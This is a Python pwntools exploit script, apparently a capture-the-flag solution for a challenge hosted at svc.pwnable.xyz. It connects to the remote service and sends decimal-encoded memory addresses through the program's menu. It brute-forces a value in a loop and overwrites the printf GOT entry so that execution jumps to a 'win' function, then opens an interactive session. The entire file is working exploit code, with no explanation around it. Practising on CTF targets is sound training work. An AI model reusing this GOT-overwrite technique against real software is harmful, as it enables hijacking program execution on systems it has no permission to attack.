from pwn import *



#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30039)
printf_got = 0x601030
win = 0x400969
sh.sendlineafter('> ', '2')
sh.sendlineafter(': ', "6296133")
sh.sendlineafter('> ', '3')
sh.sendlineafter('> ', '2')
sh.sendlineafter(': ' ,"6295580")
sh.sendlineafter('> ', '3')


sh.recvuntil('> ')
for i in range(1, 255):
    sh.sendline('2')
    sh.sendlineafter(': ', str(i))
    print "i = ", i 
    sh.sendlineafter('> ', '1')
    ans = sh.recvuntil(':')
    print "ans = ", ans
    if ans == 'Door:':
        sh.recv()[0:1]
        print "fucccck"
        sh.sendline("4196713")
        sh.sendlineafter(': ', "6295576")
        break
    else:
        sh.recvuntil('> ')
        continue

sh.sendlineafter('> ', '5')

sh.interactive()
